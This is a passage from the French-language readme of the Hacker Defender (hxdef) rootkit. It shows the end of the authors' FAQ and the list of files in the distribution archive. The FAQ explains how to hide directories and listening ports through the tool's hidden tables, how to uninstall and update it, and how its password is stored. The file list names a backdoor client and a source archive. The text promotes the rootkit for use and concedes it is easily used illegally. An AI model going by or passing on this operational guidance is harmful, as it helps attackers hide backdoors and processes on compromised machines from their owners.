R: envoyez moi un mail en expliquant en quoi vous pourriez contribuer à hxdef 
et quel est votre experience du betatest de maniere genarale.


18) Est-il legal d'utiliser hxdef?

R: Bien sur que ca l'est. Mais hxdef peut aisement estre utilise à des fins 
illegales.


19) Est-il possible de mettre à jour une ancienne version de hxdef avec une 
nouvelles ? est-ce possible sans rebooter la machine?

R: Ce n'est pas possible sans rebooter. pour la mise à jour cf ci-dessous.


20) Est-il preferable d'utiliser -:unisinstall ou net stop ServiceName?

R: Oui vous pouvez simplement utiliser -:uninstall pour supprimer cette version 
de HXdef dans rebooter. Ensuite installes simplement la nouvelle version.
La meilleur maniere est -:uninstall. Mais net stop fonctionnera aussi.


21) J'aime vraiment ce programme. puis-je offrir une petite donation à son 
auteur?

R: Nous n'en avons pas besion, envoyez plutot votre argent à es ONGde votre 
pays et ecrivez nous leur mail. 


22) Y a t il une chance de cacher c:\temp et non c:\winnt\temp?

R: Non. creez votre propre repertoire avec un nom specifique et ajoutez le dans 
la HIDDEN TABLE.


23) Je peut voir le mot de pass dans le fichier ini en texte non code! 
Comment est-ce possible?

R: Vous penserez peut-etre que c'esr relativement peu securisecomme maniere de 
stocker son mot de passe mais si vous cache le fichier ini personne ne pourr la
lire.
Donc c'est secure. ET c'est facile del le changer à n'importe quel momentet 
vous pouvez utiliser la commande -:refresh pour changer le pass facillement.


24)  Si j'ai un porcessus qui est cache dans Hidden Table et qu'll attend des
connection sur un port, ce port sera t il automaqituqement cache ou devrais-je 
le rajouter dans Hidden Ports?


R: les ports caches sont seulement ceux qui sont dans Hidden Ports list. Donc, 
oui vous devriez le rajouter dans Hidden Ports.



=====[ 8. Fichiers ]============================================================

	Une archive originale de Hacker defender v1.0.0 contient ces fichiers:

hxdef100.exe	70 144 b	- programe Hacker defender v1.0.0
hxdef100.ini	 3 872 b	- inifile avec les reglages par defaut
hxdef100.2.ini	 3 695 b	- inifile avec les reglages par defaut, 
				  variante 2
bdcli100.exe	26 624 b	- le client de la backdoor
rdrbs100.exe	49 152 b	- la base de redirection
readmecz.txt	34 654 b	- la version Czech du readme
readmeen.txt	35 956 b	- la version anglaise du readme
readmefr.txt	38 029 b	- ce fichier
src.zip		91 936 b	- source 

===================================[ Fin ]======================================
